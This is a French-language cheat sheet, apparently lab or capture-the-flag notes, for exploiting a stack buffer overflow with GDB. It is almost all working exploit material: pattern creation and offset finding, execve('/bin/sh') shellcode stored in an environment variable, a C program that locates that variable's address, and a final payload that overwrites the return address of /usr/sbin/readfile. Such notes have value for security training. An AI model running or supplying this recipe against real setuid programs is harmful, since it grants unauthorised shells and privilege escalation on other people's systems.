
# GDB - Débogage et Exploitation

## Vérification des protections

```bash
checksec
```

## Création et recherche d'un pattern

```bash
pattern_create 100
r 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
pattern_search
```

## Détermination de l'offset

```bash
# [RSP] --> Offset = 88, Taille ~12 octets
r $(python2 -c 'print "A"*88+"B"*8')
```

## Injection de shellcode

```bash
# Shellcode Linux x86_64 (execve /bin/sh)
# Source : http://shell-storm.org/shellcode/files/shellcode-806.html
shellcode="\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

r $(python2 -c 'print "'"$shellcode"'" + "A"*(88-27) + "B"*6')
```

## Trouver l'adresse du shellcode dans l'environnement

```bash
export SHELLCODE=$(python2 -c 'print "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"')
```

## Programme pour obtenir l'adresse d'une variable d'environnement

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[]) {
    char *ptr;

    if(argc < 3) {
        printf("Usage: %s <env_variable> <target_program>\n", argv[0]);
        return 1;
    }

    ptr = getenv(argv[1]);
    if (ptr == NULL) {
        printf("Environnement variable introuvable\n");
        return 1;
    }

    ptr += (strlen(argv[0]) - strlen(argv[2])) * 2;
    printf("%s se trouve à l'adresse : %p\n", argv[1], (void *)ptr);
    return 0;
}
```

## Compilation et exécution

```bash
gcc getenv.c -o getenv
chmod +x getenv
./getenv SHELLCODE /usr/sbin/readfile
```

## Exploitation avec l'adresse trouvée

```bash
/usr/sbin/readfile $(python2 -c 'print "A"*88+"\x52\xe7\xff\xff\xff\x7f"')
```